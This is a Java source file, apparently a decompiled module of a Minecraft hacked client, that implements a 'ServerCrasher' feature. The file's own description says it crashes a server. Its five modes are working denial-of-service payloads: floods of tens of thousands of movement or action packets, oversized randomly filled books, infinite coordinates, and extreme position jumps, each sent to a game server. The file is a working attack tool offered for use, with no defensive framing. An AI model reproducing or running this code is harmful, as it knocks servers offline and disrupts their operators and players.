package remapped;

public class class_1931 extends class_367 {
   private int field_9875;

   public class_1931() {
      super("ServerCrasher", "Crashes a server", Category.WORLD);
      this.addSetting(new ModeSetting("Mode", "Crasher mode", 0, "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze"));
   }

   @Override
   public void onEnable() {
      this.field_9875 = 0;
   }

   @EventListen
   private void method_8971(class_5596 var1) {
      if (this.method_42015()) {
         if (mcInstance.method_8520()) {
            this.method_41999();
         } else {
            String var4 = this.getStringValueByName("Mode");
            switch (var4) {
               case "Flying Enabled":
                  double var6 = mcInstance.field_9632.method_37302();
                  double var8 = mcInstance.field_9632.method_37309();
                  double var10 = mcInstance.field_9632.method_37156();
                  double var12 = 0.0;
                  double var14 = 0.0;

                  for (int var26 = 0; var26 < 50000; var26++) {
                     var14 = (double)(var26 * 7);
                     mcInstance.method_8614().method_4813(new class_9515(var6 - var14, var8 + var12, var10 + var14, false));
                  }

                  class_6324.method_28832("Trying to crash the server..");
                  this.method_41999();
                  break;
               case "Vanilla":
                  if (this.field_9875++ >= 10) {
                     this.field_9875 = 0;

                     for (int var25 = 0; var25 < 100000; var25++) {
                        mcInstance.method_8614().method_4813(new class_3195(class_2584.field_12791));
                     }

                     class_6324.method_28832("Trying to crash the server..");
                  }
                  break;
               case "Book":
                  class_6098 var16 = new class_6098(class_4897.field_24805);
                  class_3416 var17 = new class_3416();
                  class_5734 var18 = new class_5734();
                  String var19 = "";

                  for (int var20 = 0; var20 < 5000; var20++) {
                     char var21 = (char)Math.round(32.0F + (float)Math.random() * 94.0F);
                     var19 = var19 + var21;
                  }

                  for (int var27 = 0; var27 < 50; var27++) {
                     class_473 var22 = new class_473(var19);
                     var17.add(var22);
                  }

                  var18.method_25941("author", "LeakedPvP");
                  var18.method_25941("title", "Sigma");
                  var18.method_25946("pages", var17);
                  var16.method_27954("pages", var17);
                  var16.method_27965(var18);

                  for (int var28 = 0; var28 < 100; var28++) {
                     try {
                        mcInstance.method_8614().method_4813(new class_6362(0, var16));
                     } catch (Exception var23) {
                     }
                  }

                  this.method_41999();
                  break;
               case "Infinity":
                  mcInstance.method_8614().method_4813(new class_9515(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                  class_6324.method_28832("Trying to crash the server..");
                  this.method_41999();
                  break;
               case "BrainFreeze":
                  mcInstance.method_8614()
                     .method_4813(
                        new class_9515(
                           mcInstance.field_9632.method_37302() + 9999.0,
                           mcInstance.field_9632.method_37309() + 9999.0,
                           mcInstance.field_9632.method_37156() + 9999.0,
                           false
                        )
                     );
                  mcInstance.method_8614()
                     .method_4813(
                        new class_9515(
                           mcInstance.field_9632.method_37302(),
                           mcInstance.field_9632.method_37241().field_19937,
                           mcInstance.field_9632.method_37156() + 9999.0,
                           mcInstance.field_9632.field_41726
                        )
                     );
                  if (this.field_9875++ >= 200) {
                     this.method_41999();
                     class_6324.method_28832("Trying to crash the server..");
                  }
            }
         }
      }
   }
}
